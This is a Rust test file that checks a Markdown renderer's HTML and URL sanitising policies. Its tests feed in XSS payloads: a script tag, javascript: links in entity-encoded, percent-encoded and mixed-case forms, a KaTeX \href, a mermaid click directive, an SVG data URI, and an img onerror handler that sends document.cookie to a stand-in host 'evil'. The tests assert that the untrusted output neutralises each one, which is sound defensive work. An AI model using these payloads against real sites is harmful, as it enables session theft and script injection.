//! Render-time security policy behaviour.
//!
//! Two jobs. The `vector_*` tests are the attack cases: each is a payload that
//! reached a reader's browser as executable content before the policies
//! existed. The `policy_*` tests pin the exact HTML each policy emits, because
//! a security control that is not pinned drifts.

use marco_core::{parse, render, HtmlPolicy, RenderOptions, UrlPolicy};

fn render_with(markdown: &str, options: &RenderOptions) -> String {
    let doc = parse(markdown).expect("fixture should parse");
    render(&doc, options).expect("fixture should render")
}

fn untrusted(markdown: &str) -> String {
    render_with(markdown, &RenderOptions::untrusted())
}

// ---------------------------------------------------------------------------
// Attack vectors
// ---------------------------------------------------------------------------

#[test]
fn vector_1_script_block() {
    let html = untrusted("<script>alert(1)</script>\n");
    assert!(!html.contains("<script"), "script tag survived: {html}");
}

/// Note what is asserted: that no *live* `<img` element is emitted. The escaped
/// form legitimately contains the literal text `onerror`, because showing the
/// author what they wrote is the point of `Escape` — so a naive
/// `!contains("onerror")` would fail on correct, inert output.
#[test]
fn vector_2_inline_event_handler() {
    let html = untrusted("Look: <img src=x onerror=\"fetch('//evil/'+document.cookie)\">\n");

    assert!(!html.contains("<img"), "live img survived: {html}");
    assert!(
        html.contains("&lt;img"),
        "expected the tag as escaped text: {html}"
    );
}

#[test]
fn vector_3_javascript_link() {
    let html = untrusted("[Accept proposal](javascript:alert(1))\n");
    assert!(!html.contains("javascript:"), "scheme survived: {html}");
    assert!(!html.contains("<a "), "anchor survived: {html}");
    // The reader should still see the text; only the anchor is dropped.
    assert!(html.contains("Accept proposal"), "text was lost: {html}");
}

/// The goldmark bypass: the scheme is entity-encoded, so a filter that reads
/// the raw string sees no `javascript:` at all — but the browser decodes it.
#[test]
fn vector_4_entity_encoded_scheme() {
    for markdown in [
        "[x](javascript&colon;alert(1))\n",
        "[x](javascript&#58;alert(1))\n",
        "[x](javascript&#x3a;alert(1))\n",
        "[x](%6aavascript:alert(1))\n",
        "[x](JaVaScRiPt:alert(1))\n",
        "[x](java\tscript:alert(1))\n",
    ] {
        let html = untrusted(markdown);
        assert!(
            !html.contains("<a "),
            "anchor survived for {markdown:?}: {html}"
        );
    }
}

/// KaTeX rejects `\href` because `trust` is off, so no anchor is produced.
/// The assertion is deliberately about the anchor and not about the string
/// `javascript:` — the MathML `<annotation>` echoes the LaTeX source verbatim,
/// so the literal text appears in safe output as inert content.
#[cfg(feature = "render-math")]
#[test]
fn vector_5_math_href() {
    let html = untrusted("Math: $\\href{javascript:alert(1)}{click me}$\n");
    assert!(!html.contains("<a "), "anchor survived: {html}");
    assert!(!html.contains("href="), "href attribute survived: {html}");
}

/// A mermaid `click` directive made the diagram renderer emit an unfiltered
/// anchor into the SVG, which was spliced into the page verbatim.
#[cfg(feature = "render-diagrams")]
#[test]
fn vector_6_mermaid_click_directive() {
    let markdown = "```mermaid\ngraph TD\n  A[Click me] --> B[Other]\n  click A \"javascript:alert(1)\" \"tip\"\n```\n";

    let html = untrusted(markdown);
    assert!(!html.contains("javascript:"), "scheme survived: {html}");
    assert!(!html.contains("<a "), "anchor survived: {html}");
    // The diagram itself must still render.
    assert!(html.contains("<svg"), "diagram was lost: {html}");
}

// ---------------------------------------------------------------------------
// HtmlPolicy — exact output
// ---------------------------------------------------------------------------

#[test]
fn policy_html_inline_keeps_content_under_every_policy() {
    let md = "Before <b>bold</b> after\n";

    let allow = render_with(md, &RenderOptions::commonmark());
    let escape = render_with(md, &RenderOptions::new().with_html(HtmlPolicy::Escape));
    let strip = render_with(md, &RenderOptions::new().with_html(HtmlPolicy::Strip));

    assert_eq!(allow, "<p>Before <b>bold</b> after</p>\n");
    assert_eq!(
        escape, "<p>Before &lt;b&gt;bold&lt;/b&gt; after</p>\n",
        "escape should show the markup as text"
    );
    assert_eq!(
        strip, "<p>Before bold after</p>\n",
        "inline stripping loses the tag, never the text it wraps"
    );
}

/// The asymmetry that surprises people: an HTML *block* carries its own text,
/// so stripping one destroys author content. The placeholder is what makes that
/// loss greppable.
#[test]
fn policy_html_block_strip_loses_content_and_says_so() {
    let md = "<div>Important note</div>\n";

    let strip = render_with(md, &RenderOptions::new().with_html(HtmlPolicy::Strip));
    assert_eq!(strip, "<!-- raw HTML omitted -->\n");
    assert!(
        !strip.contains("Important note"),
        "block stripping removes the text too, by design"
    );

    // Escape keeps it, which is why Escape is the default.
    let escape = render_with(md, &RenderOptions::new().with_html(HtmlPolicy::Escape));
    assert!(escape.contains("Important note"), "got: {escape}");
    assert!(escape.contains("&lt;div&gt;"), "got: {escape}");
}

/// Escaping a comment would turn an invisible note into visible text, so
/// comments are removed under both safe policies.
#[test]
fn policy_html_comments_are_removed_never_escaped() {
    let md = "<!-- internal note -->\n";

    let allow = render_with(md, &RenderOptions::commonmark());
    assert!(allow.contains("<!-- internal note -->"), "got: {allow}");

    for policy in [HtmlPolicy::Escape, HtmlPolicy::Strip] {
        let html = render_with(md, &RenderOptions::new().with_html(policy));
        assert!(
            !html.contains("internal note"),
            "{policy:?} leaked the comment body: {html}"
        );
        assert!(
            !html.contains("&lt;!--"),
            "{policy:?} escaped the comment into visible text: {html}"
        );
    }
}

// ---------------------------------------------------------------------------
// UrlPolicy — exact output
// ---------------------------------------------------------------------------

#[test]
fn policy_url_safe_links_survive_every_policy() {
    let md = "[docs](https://example.com/a?b=1#c)\n";
    let expected = "<p><a href=\"https://example.com/a?b=1#c\">docs</a></p>\n";

    for policy in [
        UrlPolicy::Allow,
        UrlPolicy::BlockDangerous,
        UrlPolicy::SafeSchemesOnly,
    ] {
        let html = render_with(md, &RenderOptions::commonmark().with_urls(policy));
        assert_eq!(html, expected, "{policy:?} altered a safe link");
    }
}

#[test]
fn policy_url_relative_links_survive_every_policy() {
    for md in [
        "[a](./relative)\n",
        "[a](/absolute)\n",
        "[a](#fragment)\n",
        "[a](//host/path)\n",
    ] {
        let html = render_with(md, &RenderOptions::untrusted());
        assert!(html.contains("<a href="), "{md:?} was blocked: {html}");
    }
}

/// The difference between the two filtering policies, stated as a test: a
/// denylist passes what it does not recognise, an allowlist does not.
#[test]
fn policy_url_unknown_schemes_separate_denylist_from_allowlist() {
    let md = "[open in editor](vscode://file/tmp/x)\n";

    let blocked = render_with(
        md,
        &RenderOptions::new().with_urls(UrlPolicy::BlockDangerous),
    );
    assert!(
        blocked.contains("<a href=\"vscode://file/tmp/x\">"),
        "BlockDangerous should pass an unknown scheme: {blocked}"
    );

    let strict = render_with(
        md,
        &RenderOptions::new().with_urls(UrlPolicy::SafeSchemesOnly),
    );
    assert!(
        !strict.contains("<a "),
        "SafeSchemesOnly should block an unknown scheme: {strict}"
    );
}

/// The payload deliberately has no parentheses: a CommonMark link destination
/// ends at the first `)`, so `javascript:alert(1)` would leave a stray `)` as
/// literal text and muddy an exact-output assertion.
#[test]
fn policy_url_blocked_image_falls_back_to_alt_text() {
    let md = "![a diagram](javascript:alert)\n";
    let html = render_with(md, &RenderOptions::untrusted());

    assert_eq!(html, "<p>a diagram</p>\n");
}

/// An inert base64 raster image is exempt as an image source, because it cannot
/// execute — but not as a link destination, which a reader can click.
#[test]
fn policy_url_inert_data_image_is_exempt_for_images_only() {
    let src = "data:image/png;base64,iVBORw0KGgo=";
    let options = RenderOptions::new().with_urls(UrlPolicy::BlockDangerous);

    let image = render_with(&format!("![logo]({src})\n"), &options);
    assert!(
        image.contains("<img src=\""),
        "inert image blocked: {image}"
    );

    let link = render_with(&format!("[click]({src})\n"), &options);
    assert!(!link.contains("<a "), "clickable data URL allowed: {link}");
}

/// `image/svg+xml` is an image mediatype but a script-capable one in the
/// WebViews this crate's HTML is rendered in, so it gets no exemption.
#[test]
fn policy_url_svg_data_uri_is_not_exempt() {
    let md = "![x](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)\n";
    let html = render_with(
        md,
        &RenderOptions::new().with_urls(UrlPolicy::BlockDangerous),
    );

    assert!(!html.contains("<img"), "svg data URI allowed: {html}");
}

// ---------------------------------------------------------------------------
// Presets
// ---------------------------------------------------------------------------

#[test]
fn preset_commonmark_emits_everything() {
    let md = "<b>x</b> [y](javascript:alert(1))\n";
    let html = render_with(md, &RenderOptions::commonmark());

    assert!(html.contains("<b>x</b>"), "got: {html}");
    assert!(html.contains("javascript:alert(1"), "got: {html}");
}

#[test]
fn preset_default_escapes_html_and_blocks_dangerous_urls() {
    let md = "<b>x</b> [y](javascript:alert(1)) [z](vscode://x)\n";
    let html = render_with(md, &RenderOptions::default());

    assert!(html.contains("&lt;b&gt;"), "raw HTML not escaped: {html}");
    assert!(!html.contains("javascript:"), "got: {html}");
    assert!(
        html.contains("vscode://x"),
        "denylist blocked unknown: {html}"
    );
}

#[test]
fn preset_untrusted_is_strictest() {
    let md = "<b>x</b> [y](javascript:alert(1)) [z](vscode://x)\n";
    let html = render_with(md, &RenderOptions::untrusted());

    assert!(html.contains("&lt;b&gt;"), "raw HTML not escaped: {html}");
    assert!(!html.contains("javascript:"), "got: {html}");
    assert!(
        !html.contains("vscode://x"),
        "unknown scheme allowed: {html}"
    );
}
